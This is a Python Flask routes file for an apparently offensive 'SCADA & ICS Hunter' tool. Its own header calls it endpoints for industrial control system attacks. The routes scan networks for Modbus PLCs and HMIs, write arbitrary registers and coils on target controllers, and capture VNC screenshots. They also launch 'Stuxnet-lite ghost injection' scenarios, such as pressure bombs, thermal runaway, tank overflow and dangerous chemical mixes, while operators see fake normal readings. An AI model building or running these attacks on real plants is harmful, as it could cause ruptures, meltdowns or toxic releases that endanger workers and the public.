"""
SCADA & ICS Hunter Flask Routes
================================
API endpoints for industrial control system attacks.

Author: ITherso
"""

from flask import Blueprint, render_template, request, jsonify
import json
from datetime import datetime

# Try to import login_required, fallback to dummy decorator
try:
    from flask_login import login_required
except ImportError:
    def login_required(f):
        return f

# Import the SCADA ICS Hunter module
try:
    import sys
    sys.path.insert(0, '/home/kali/Desktop/tools')
    from scada_ics_hunter import (
        get_scada_ics_hunter,
        ModbusFunctionCode,
        ICSProtocol,
        PLCVendor
    )
    SCADA_AVAILABLE = True
except ImportError as e:
    print(f"[IMPORT ERROR] scada_ics_hunter: {e}")
    SCADA_AVAILABLE = False
    get_scada_ics_hunter = None

scada_bp = Blueprint('scada', __name__, url_prefix='/scada')


# Default attack scenarios (fallback)
DEFAULT_SCENARIOS = {
    "centrifuge_sabotage": {
        "name": "Santrifüj Sabotaj",
        "description": "Stuxnet-style: Speed up centrifuges while showing normal RPM",
        "display": "normal",
        "actual": "dangerous"
    },
    "pressure_bomb": {
        "name": "Basınç Bombası",
        "description": "Increase pressure while showing safe readings",
        "display": "5 bar (safe)",
        "actual": "15 bar (rupture)"
    },
    "thermal_runaway": {
        "name": "Termal Kaçış",
        "description": "Disable cooling while showing normal temps",
        "display": "45°C (normal)",
        "actual": "500°C (meltdown)"
    },
    "overflow_attack": {
        "name": "Tank Taşırma",
        "description": "Fill tanks while showing low level",
        "display": "30% (normal)",
        "actual": "overflow imminent"
    },
    "chemical_mix": {
        "name": "Kimyasal Karışım",
        "description": "Alter chemical ratios while showing correct mix",
        "display": "1:1 ratio",
        "actual": "1:10 ratio (dangerous)"
    }
}


# =============================================================================
# MAIN DASHBOARD
# =============================================================================

@scada_bp.route('/')
@login_required
def scada_dashboard():
    """Main SCADA & ICS Hunter dashboard"""
    if SCADA_AVAILABLE and get_scada_ics_hunter:
        try:
            hunter = get_scada_ics_hunter()
            status = hunter.get_status()
            protocols = hunter.get_ics_protocols()
            vendors = hunter.get_plc_vendors()
            scenarios = hunter.modbus_injector.get_attack_scenarios()
        except Exception as e:
            print(f"[ERROR] SCADA Hunter: {e}")
            status = {"module": "SCADA & ICS Hunter", "error": str(e)}
            protocols = []
            vendors = []
            scenarios = DEFAULT_SCENARIOS
    else:
        status = {"module": "SCADA & ICS Hunter", "version": "1.0.0", "mode": "demo"}
        protocols = [
            {"id": "modbus_tcp", "name": "MODBUS_TCP", "port": 502},
            {"id": "s7comm", "name": "S7COMM", "port": 102},
            {"id": "enip", "name": "ENIP", "port": 44818},
            {"id": "dnp3", "name": "DNP3", "port": 20000},
            {"id": "opc_ua", "name": "OPC_UA", "port": 4840},
        ]
        vendors = ["siemens", "allen_bradley", "schneider", "mitsubishi", "omron", "abb", "honeywell", "ge"]
        scenarios = DEFAULT_SCENARIOS
    
    return render_template(
        'scada_ics_hunter.html',
        status=status,
        protocols=protocols,
        vendors=vendors,
        scenarios=scenarios
    )


# =============================================================================
# STATUS & INFO
# =============================================================================

@scada_bp.route('/api/status', methods=['GET'])
@login_required
def get_status():
    """Get module status"""
    if not SCADA_AVAILABLE:
        return jsonify({"error": "SCADA module not available", "mode": "demo"})
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.get_status())


@scada_bp.route('/api/protocols', methods=['GET'])
@login_required
def get_protocols():
    """Get supported ICS protocols"""
    if not SCADA_AVAILABLE:
        return jsonify([])
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.get_ics_protocols())


@scada_bp.route('/api/vendors', methods=['GET'])
@login_required
def get_vendors():
    """Get known PLC vendors"""
    if not SCADA_AVAILABLE:
        return jsonify([])
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.get_plc_vendors())


# =============================================================================
# MODBUS OPERATIONS
# =============================================================================

@scada_bp.route('/api/modbus/scan', methods=['POST'])
@login_required
def scan_modbus():
    """Scan network for Modbus devices"""
    if not SCADA_AVAILABLE:
        return jsonify({"success": False, "error": "SCADA module not available"})
    
    data = request.get_json() or {}
    ip_range = data.get('ip_range', '192.168.1.0/24')
    timeout = data.get('timeout', 2.0)
    
    try:
        hunter = get_scada_ics_hunter()
        devices = hunter.modbus_injector.scan_network(ip_range, timeout=timeout)
        
        return jsonify({
            "success": True,
            "devices_found": len(devices),
            "devices": [
                {
                    "ip": d.ip,
                    "port": d.port,
                    "protocol": d.protocol,
                    "vendor": d.vendor,
                    "model": d.model,
                    "is_vulnerable": d.is_vulnerable
                }
                for d in devices
            ]
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@scada_bp.route('/api/modbus/devices', methods=['GET'])
@login_required
def get_modbus_devices():
    """Get discovered Modbus devices"""
    if not SCADA_AVAILABLE:
        return jsonify([])
    
    try:
        hunter = get_scada_ics_hunter()
        devices = hunter.modbus_injector.discovered_devices
        
        return jsonify([
            {
                "ip": d.ip,
                "port": d.port,
                "protocol": d.protocol,
                "vendor": d.vendor,
                "model": d.model,
                "is_vulnerable": d.is_vulnerable,
                "discovered_at": d.discovered_at.isoformat()
            }
            for d in devices
        ])
    except Exception as e:
        return jsonify([])


@scada_bp.route('/api/modbus/read-registers', methods=['POST'])
@login_required
def read_registers():
    """Read holding registers from PLC"""
    if not SCADA_AVAILABLE:
        return jsonify({"success": False, "error": "SCADA module not available"})
    
    data = request.get_json() or {}
    target_ip = data.get('target_ip')
    start_address = data.get('start_address', 0)
    count = data.get('count', 10)
    unit_id = data.get('unit_id', 1)
    
    if not target_ip:
        return jsonify({"success": False, "error": "target_ip required"}), 400
    
    try:
        hunter = get_scada_ics_hunter()
        registers = hunter.modbus_injector.read_registers(
            target_ip, start_address, count, unit_id
        )
        
        return jsonify({
            "success": True,
            "target_ip": target_ip,
            "registers": registers
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@scada_bp.route('/api/modbus/read-coils', methods=['POST'])
@login_required
def read_coils():
    """Read coils from PLC"""
    if not SCADA_AVAILABLE:
        return jsonify({"success": False, "error": "SCADA module not available"})
    
    data = request.get_json() or {}
    target_ip = data.get('target_ip')
    start_address = data.get('start_address', 0)
    count = data.get('count', 16)
    unit_id = data.get('unit_id', 1)
    
    if not target_ip:
        return jsonify({"success": False, "error": "target_ip required"}), 400
    
    try:
        hunter = get_scada_ics_hunter()
        coils = hunter.modbus_injector.read_coils(
            target_ip, start_address, count, unit_id
        )
        
        return jsonify({
            "success": True,
            "target_ip": target_ip,
            "coils": coils
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@scada_bp.route('/api/modbus/write-register', methods=['POST'])
@login_required
def write_register():
    """Write single holding register"""
    if not SCADA_AVAILABLE:
        return jsonify({"success": False, "error": "SCADA module not available"})
    
    data = request.get_json() or {}
    target_ip = data.get('target_ip')
    address = data.get('address')
    value = data.get('value')
    unit_id = data.get('unit_id', 1)
    
    if not all([target_ip, address is not None, value is not None]):
        return jsonify({"success": False, "error": "target_ip, address, value required"}), 400
    
    try:
        hunter = get_scada_ics_hunter()
        success = hunter.modbus_injector.write_register(target_ip, address, value, unit_id)
        
        return jsonify({
            "success": success,
            "target_ip": target_ip,
            "address": address,
            "value": value
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@scada_bp.route('/api/modbus/write-coil', methods=['POST'])
@login_required
def write_coil():
    """Write single coil"""
    if not SCADA_AVAILABLE:
        return jsonify({"success": False, "error": "SCADA module not available"})
    
    data = request.get_json() or {}
    target_ip = data.get('target_ip')
    address = data.get('address')
    value = data.get('value')
    unit_id = data.get('unit_id', 1)
    
    if not all([target_ip, address is not None, value is not None]):
        return jsonify({"success": False, "error": "target_ip, address, value required"}), 400
    
    try:
        hunter = get_scada_ics_hunter()
        success = hunter.modbus_injector.write_coil(target_ip, address, bool(value), unit_id)
        
        return jsonify({
            "success": success,
            "target_ip": target_ip,
            "address": address,
            "value": value
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


# =============================================================================
# GHOST INJECTION
# =============================================================================

@scada_bp.route('/api/ghost/scenarios', methods=['GET'])
@login_required
def get_scenarios():
    """Get available ghost injection scenarios"""
    if not SCADA_AVAILABLE:
        return jsonify(DEFAULT_SCENARIOS)
    try:
        hunter = get_scada_ics_hunter()
        return jsonify(hunter.modbus_injector.get_attack_scenarios())
    except:
        return jsonify(DEFAULT_SCENARIOS)


@scada_bp.route('/api/ghost/start', methods=['POST'])
@login_required
def start_ghost_injection():
    """Start Stuxnet-lite ghost injection"""
    if not SCADA_AVAILABLE:
        return jsonify({"success": False, "error": "SCADA module not available"})
    
    data = request.get_json() or {}
    target_ip = data.get('target_ip')
    scenario = data.get('scenario', 'pressure_bomb')
    duration = data.get('duration', 60)
    
    if not target_ip:
        return jsonify({"success": False, "error": "target_ip required"}), 400
    
    try:
        hunter = get_scada_ics_hunter()
        result = hunter.modbus_injector.start_ghost_injection(
            target_ip, scenario, duration
        )
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@scada_bp.route('/api/ghost/stop', methods=['POST'])
@login_required
def stop_ghost_injection():
    """Stop ghost injection"""
    if not SCADA_AVAILABLE:
        return jsonify({"success": False})
    
    data = request.get_json() or {}
    injection_id = data.get('injection_id')
    
    if not injection_id:
        return jsonify({"success": False, "error": "injection_id required"}), 400
    
    try:
        hunter = get_scada_ics_hunter()
        success = hunter.modbus_injector.stop_injection(injection_id)
        return jsonify({"success": success})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@scada_bp.route('/api/ghost/active', methods=['GET'])
@login_required
def get_active_injections():
    """Get active ghost injections"""
    if not SCADA_AVAILABLE:
        return jsonify([])
    try:
        hunter = get_scada_ics_hunter()
        return jsonify(hunter.modbus_injector.get_active_injections())
    except:
        return jsonify([])


@scada_bp.route('/api/ghost/hmi-data', methods=['GET'])
@login_required
def get_fake_hmi_data():
    """Get fake HMI display data"""
    scenario = request.args.get('scenario', 'normal')
    
    if not SCADA_AVAILABLE:
        return jsonify({
            "temperature_1": {"display": 45, "actual": 45, "unit": "°C", "status": "NORMAL"},
            "pressure_1": {"display": 5.2, "actual": 5.2, "unit": "bar", "status": "NORMAL"},
            "flow_1": {"display": 45, "actual": 45, "unit": "L/min", "status": "NORMAL"},
            "tank_level_1": {"display": 65, "actual": 65, "unit": "%", "status": "NORMAL"},
        })
    
    try:
        hunter = get_scada_ics_hunter()
        data = hunter.modbus_injector.generate_fake_hmi_data(scenario)
        return jsonify(data)
    except Exception as e:
        return jsonify({"error": str(e)})


# =============================================================================
# HMI SCREENSHOTTER
# =============================================================================

@scada_bp.route('/api/hmi/scan', methods=['POST'])
@login_required
def scan_hmis():
    """Scan network for HMI systems"""
    if not SCADA_AVAILABLE:
        return jsonify({"success": False, "error": "SCADA module not available", "hmis": [], "hmis_found": 0})
    
    data = request.get_json() or {}
    ip_range = data.get('ip_range', '192.168.1.0/24')
    timeout = data.get('timeout', 3.0)
    
    try:
        hunter = get_scada_ics_hunter()
        hmis = hunter.hmi_screenshotter.scan_for_hmis(ip_range, timeout)
        return jsonify({
            "success": True,
            "hmis_found": len(hmis),
            "hmis": hmis
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e), "hmis": [], "hmis_found": 0})


@scada_bp.route('/api/hmi/list', methods=['GET'])
@login_required
def get_hmis():
    """Get discovered HMI systems"""
    if not SCADA_AVAILABLE:
        return jsonify([])
    try:
        hunter = get_scada_ics_hunter()
        return jsonify(hunter.hmi_screenshotter.get_discovered_hmis())
    except:
        return jsonify([])


@scada_bp.route('/api/hmi/screenshot', methods=['POST'])
@login_required
def capture_screenshot():
    """Capture screenshot from HMI via VNC"""
    if not SCADA_AVAILABLE:
        return jsonify({"success": False, "error": "SCADA module not available"})
    
    data = request.get_json() or {}
    target_ip = data.get('target_ip')
    target_port = data.get('target_port', 5900)
    
    if not target_ip:
        return jsonify({"success": False, "error": "target_ip required"}), 400
    
    try:
        hunter = get_scada_ics_hunter()
        screenshot = hunter.hmi_screenshotter.capture_vnc_screenshot(target_ip, target_port)
        
        if screenshot:
            return jsonify({
                "success": True,
                "capture_id": screenshot.capture_id,
                "target_ip": screenshot.target_ip,
                "width": screenshot.width,
                "height": screenshot.height,
                "timestamp": screenshot.timestamp.isoformat()
            })
        else:
            return jsonify({
                "success": False,
                "error": "Failed to capture screenshot (auth required or connection failed)"
            })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@scada_bp.route('/api/hmi/screenshots', methods=['GET'])
@login_required
def get_screenshots():
    """Get captured screenshots"""
    if not SCADA_AVAILABLE:
        return jsonify([])
    try:
        hunter = get_scada_ics_hunter()
        return jsonify(hunter.hmi_screenshotter.get_captured_screenshots())
    except:
        return jsonify([])


@scada_bp.route('/api/hmi/vulnerable', methods=['GET'])
@login_required
def get_vulnerable_hmis():
    """Get known vulnerable HMI systems info"""
    if not SCADA_AVAILABLE:
        return jsonify({})
    try:
        hunter = get_scada_ics_hunter()
        return jsonify(hunter.hmi_screenshotter.VULNERABLE_HMIS)
    except:
        return jsonify({})


# =============================================================================
# ERROR HANDLER
# =============================================================================

@scada_bp.errorhandler(Exception)
def handle_error(error):
    """Global error handler"""
    return jsonify({
        "success": False,
        "error": str(error),
        "type": type(error).__name__
    }), 500
